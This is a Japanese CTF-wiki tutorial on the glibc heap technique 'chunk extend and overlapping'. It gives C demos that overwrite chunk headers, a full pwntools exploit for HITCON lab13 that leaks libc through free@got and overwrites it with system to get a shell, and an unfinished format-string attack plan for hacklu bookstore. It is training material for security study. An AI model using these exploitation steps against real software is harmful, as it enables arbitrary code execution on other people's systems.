# Chunk Extend and Overlapping

## はじめに
chunk extend はヒープ脆弱性の一般的な攻撃手法で、extend によって chunk overlapping の効果を実現できます。この攻撃手法には、次のタイミングと条件が必要です。

* プログラムにヒープベースの脆弱性が存在する
* その脆弱性で chunk header 内のデータを制御できる

## 原理
chunk extend 技術が成立するのは、ptmalloc がヒープの chunk を操作する際に使うさまざまなマクロが理由です。

ptmalloc で chunk のサイズを取得する操作は次のとおりです。
```
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```
1つ目は chunk のサイズをそのまま取得するもので、マスク部分を無視しません。もう1つはマスク部分を無視するものです。

ptmalloc で次の chunk のアドレスを取得する操作は次のとおりです。
```
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
```
つまり、現在の chunk のポインタに現在の chunk のサイズを足します。

ptmalloc で前の chunk の情報を取得する操作は次のとおりです。
```
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
```
つまり、malloc_chunk->prev_size で前の chunk のサイズを取得し、この chunk のアドレスから、得られたサイズを引きます。

ptmalloc で、現在の chunk が使用中(use)状態かどうかを判定する操作は次のとおりです。
```
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
```
つまり、次の chunk の prev_inuse フィールドを調べます。そして、次の chunk のアドレスは、先ほど述べたとおり、現在の chunk の size から計算されます。

その他の操作の詳細は、「ヒープ関連のデータ構造」の節を参照してください。

これらのマクロから分かるように、ptmalloc は chunk header のデータによって chunk の使用状況を判断し、前後の chunk の位置を特定しています。要するに、chunk extend とは、size フィールドと pre_size フィールドを制御することで chunk をまたぐ操作を行い、その結果 overlapping を引き起こす手法です。

chunk extend に似た操作として、chunk shrink と呼ばれるものもあります。ここでは chunk extend の利用のみを紹介します。

## 基本例1:使用中の fastbin に対する extend
簡単に言うと、この攻撃の効果は、1つ目の chunk のサイズを書き換えることで2つ目の chunk の内容を制御することです。
**注意:例はすべて64ビットのプログラムです。32ビットでテストしたい場合は、8バイトのオフセットを4バイトに変えてください**。
```
int main(void)
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//1つ目の 0x10 の chunk を確保
    malloc(0x10);//2つ目の 0x10 の chunk を確保
    
    *(long long *)((long long)ptr-0x8)=0x41;// 1つ目の chunk の size フィールドを変更
    
    free(ptr);
    ptr1=malloc(0x30);// extend を実現し、2つ目の chunk の内容を制御した
    return 0;
}
```
2つの malloc 文を実行した後のヒープのメモリ配置は次のとおりです。
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 <=== top chunk
```
その後、chunk1 の size フィールドを 0x41 に書き換えます。0x41 としたのは、chunk の size フィールドにはユーザーが指定したサイズと header のサイズが含まれるためです。上に示したとおり、ちょうど 0x40 になります。問題では、この手順はヒープオーバーフローで行えます。
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== 篡改大小
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 
```
free を実行すると、chunk2 が chunk1 と合わさって 0x40 サイズの 1 つの chunk となり、まとめて解放されていることが分かります。
```
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
その後 malloc(0x30) を呼ぶと chunk1+chunk2 の領域が得られ、chunk2 の中身を直接制御できます。この状態を overlapping chunk とも呼びます。
```
call   0x400450 <malloc@plt>
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
```

## 基本例2:使用中の smallbin に対する extend
先に学んだヒープの実装の深い理解の部分から、fastbin の範囲にある chunk は解放後に fastbin のリストへ入り、この範囲にない chunk は解放後に unsorted bin のリストへ入ることが分かっています。
次の例では、サイズ 0x80 でヒープを確保します(比較のため述べると、fastbin のデフォルトの最大 chunk サイズは 0x70 です)。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//1つ目の 0x80 の chunk1 を確保
    malloc(0x10); //2つ目の 0x10 の chunk2 を確保
    malloc(0x10); //top chunk との統合を防ぐ
    
    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
```
この例では、確保する size が fastbin の範囲にないため、解放時に top chunk と隣接していると top chunk に統合されてしまいます。そのため、追加で chunk を 1 つ確保し、解放する chunk を top chunk から隔てる必要があります。
```
0x602000:	0x0000000000000000	0x00000000000000b1 <===chunk1 篡改size域
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000021 <=== 防止合并的chunk
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
解放後、chunk1 は chunk2 の内容を飲み込み、一緒に unsorted bin へ入ります。
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== 被放入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x00000000000000b0	0x0000000000000020 <=== 注意此处标记为空
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
```
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
```
再度確保すると chunk1 と chunk2 の領域が取り出されるため、chunk2 の中身を制御できるようになります。
```
     0x4005b0 <main+74>        call   0x400450 <malloc@plt>
 →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
 
     rax : 0x0000000000602010
```

## 基本例3:解放済みの smallbin に対する extend
例3は例2を土台にしたもので、今回は先に chunk1 を解放し、その後 unsorted bin にある chunk1 の size フィールドを書き換えます。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//1つ目の 0x80 の chunk1 を確保
    malloc(0x10);//2つ目の 0x10 の chunk2 を確保
    
    free(ptr);//まず解放して chunk1 を unsorted bin に入れる
    
    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
```
2回の malloc の後の結果は次のとおりです。
```
0x602000:	0x0000000000000000	0x0000000000000091 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
まず chunk1 を解放して unsorted bin に入れます。
```
     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:	0x0000000000000000	0x0000000000000091 <=== 进入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51 <=== top chunk
```
次に chunk1 の size フィールドを書き換えます。
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== size域被篡改
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
この状態で malloc で確保すると chunk1+chunk2 のヒープ領域が得られ、chunk2 の中身を制御できます。

## Chunk Extend/Shrink でできること

一般に、この技術でプログラムの実行フローを直接制御することはできませんが、chunk の中身を制御できます。chunk に文字列ポインタや関数ポインタなどがあれば、それらのポインタを使って情報の漏えいや実行フローの制御ができます。

また、extend によって chunk overlapping を実現でき、overlapping を通じて chunk の fd/bk ポインタを制御できるため、fastbin attack などの攻撃が可能になります。

## 基本例4:extend による後方 overlapping
ここでは extend による後方 overlapping を示します。これは CTF で最もよく出てくる状況で、overlapping を通じてほかのさまざまな攻撃が可能になります。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//1つ目の 0x80 の chunk1 を確保
    malloc(0x10); //2つ目の 0x10 の chunk2 を確保
    malloc(0x10); //3つ目の 0x10 の chunk3 を確保
    malloc(0x10); //4つ目の 0x10 の chunk4 を確保    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```
malloc(0x50) で extend した領域を再び埋めた後も、その中の 0x10 の fastbin の chunk は通常どおり確保・解放できます。この時点ですでに overlapping が成立しており、overlapping に対して操作することで fastbin attack を実現できます。

## 基本例5:extend による前方 overlapping
ここでは、pre_inuse フィールドと pre_size フィールドを書き換えて、前方の chunk を統合する方法を示します。
```
int main(void)
{
	void *ptr1,*ptr2,*ptr3,*ptr4;
	ptr1=malloc(128);//smallbin1
	ptr2=malloc(0x10);//fastbin1
	ptr3=malloc(0x10);//fastbin2
	ptr4=malloc(128);//smallbin2
	malloc(0x10);//top との統合を防ぐ
	free(ptr1);
	*(int *)((long long)ptr4-0x8)=0x90;//pre_inuse フィールドを変更
	*(int *)((long long)ptr4-0x10)=0xd0;//pre_size フィールドを変更
	free(ptr4);//unlink による前方 extend
	malloc(0x150);//場所を埋める chunk
	
}
```
前方 extend は smallbin の unlink の仕組みを利用します。pre_size フィールドを書き換えることで、複数の chunk をまたいで統合し、overlapping を実現できます。

## HITCON Training lab13
[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13)

### 基本情報

```shell
➜  hitcontraning_lab13 git:(master) file heapcreator
heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped
➜  hitcontraning_lab13 git:(master) checksec heapcreator
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

プログラムは64ビットの動的リンクプログラムで、主に Canary と NX が有効です。

### 基本機能

プログラムはおおよそ独自のヒープアロケータで、各ヒープには主に2つのメンバがあります。サイズと内容へのポインタです。主な機能は次のとおりです。

1. ヒープの作成。ユーザーが入力した長さに応じて対応するメモリ領域を確保し、read で指定した長さの内容を読み込みます。ここで長さは検査されておらず、長さが負数のとき、任意の長さのヒープオーバーフローという脆弱性が生じます。もちろん、前提として malloc できる必要があります。また、読み込み後に NULL を設定していません。
2. ヒープの編集。指定したインデックスと、以前に保存したヒープのサイズに基づいて内容を読み込みますが、読み込む長さが以前より 1 大きいため、**off by one の脆弱性があります**。
3. ヒープの表示。指定したインデックスのヒープのサイズと内容を出力します。
4. ヒープの削除。指定したヒープを削除し、対応するポインタを NULL に設定します。

### 攻撃

基本的な攻撃の流れは次のとおりです。

1. off by one の脆弱性を利用して次の chunk の size フィールドを上書きし、偽の chunk サイズを作る。
2. 偽の chunk サイズで確保して chunk overlap を発生させ、さらに重要なポインタを書き換える。

より具体的には、スクリプトを直接見てください。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('./libc.so.6')


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")  # 0
create(0x10, "ddaa")  # 1
# overwrite heap 1's struct's size to 0x41
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
# trigger heap 1's struct to fastbin 0x40
# heap 1's content to fastbin 0x20
delete(1)
# new heap 1's struct will point to old heap 1's content, size 0x20
# new heap 1's content will point to old heap 1's struct, size 0x30
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)
# overwrite free@got with system addr
edit(1, p64(system_addr))
# trigger system("/bin/sh")
delete(0)
r.interactive()
```

## 2015 hacklu bookstore
[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2015_hacklu_bookstore)

### 基本情報

```shell
➜  2015_hacklu_bookstore git:(master) file books    
books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
➜  2015_hacklu_bookstore git:(master) checksec books    
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

このプログラムは動的リンクの64ビットプログラムで、主に Canary と NX が有効であることが分かります。

### 基本機能

このプログラムの主な機能は本の注文で、具体的には次のとおりです。

- 最大で2冊まで注文できる。
- 番号で何冊目の本を注文するかを選び、本ごとに名前を付けられる。しかし、名前を付ける部分に任意の長さのヒープオーバーフローの脆弱性がある。
- 番号で order を削除できるが、ここでは単に free するだけで NULL にしていないため、use after free の脆弱性が生じる。
- 注文を提出(submit)すると、2冊の本の名前を連結する。上のヒープオーバーフローの問題のため、ここでもヒープオーバーフローが生じる。
- このほか、プログラムが終了する前に**書式文字列脆弱性**がある。

このプログラムの脆弱性は強力ですが、malloc するサイズはすべて完全に固定されており、確保された chunk を使って操作するしかありません。

### 攻撃の考え方

プログラムの主な脆弱性はヒープオーバーフローと書式文字列脆弱性ですが、書式文字列脆弱性を利用するには、対応する dest 配列をオーバーフローさせる必要があります。具体的な考え方は次のとおりです。

1. ヒープオーバーフローで chunk extend を行い、submit 内の `malloc(0x140uLL)` がちょうど2番目の order の位置を返すようにする。submit の前にヒープのメモリレイアウトを整えておき、文字列を連結した結果、dest がちょうど指定の書式文字列で上書きされるようにする。
2. dest を指定の書式文字列に仕立てる。これにより、一方で __libc_start_main_ret のアドレスを漏えいさせ、**もう一方でプログラムを再び実行に戻らせます**。こうして libc のベースアドレスや system などのアドレスが分かります。注意点として、submit するとプログラムはそのまま終了してしまうため、よい方法は fini_array 内の値を書き換え、プログラムの実行完了後に**期待する位置へ再び戻る**ようにすることです。ここではあるトリックを使います。プログラムは選択を読み込むたびに 128 バイトをスタック上に読み込みます。そしてプログラムが最後に dest を出力するとき、先に読み込んだ選択の部分は必ずスタック上にあるため、スタック上にあらかじめ制御フローのポインタを仕込んでおけば、プログラムの実行フローを制御できます。
3. もう一度書式文字列脆弱性を使い、free@got を system のアドレスで上書きして、任意のコマンド実行を達成する。

ここで、各引数のオフセットは次のとおりです。

- Fini_array0 : 5+8=13
- __libc_start_main_ret : 5+0x1a=31。

```
00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0
01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000
02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx
04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 ('%sffffff')
05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (' 2: Orde')
07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* '5\n' */
08:0040│      0x7ffe6a7f3f08 ◂— 0x0
... ↓
0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000
0c:0060│      0x7ffe6a7f3f28 ◂— 0x0
... ↓
0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* 'ttime' */
10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 ('vdso_get')
11:0088│      0x7ffe6a7f3f50 ◂— 0x1
12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1
13:0098│      0x7ffe6a7f3f60 ◂— 0x0
... ↓
15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15
16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp
17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1
18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00
19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15
1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
```

**!!!追記予定!!!**

## 問題

- [2016 Nuit du Hack CTF Quals : night deamonic heap](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap)

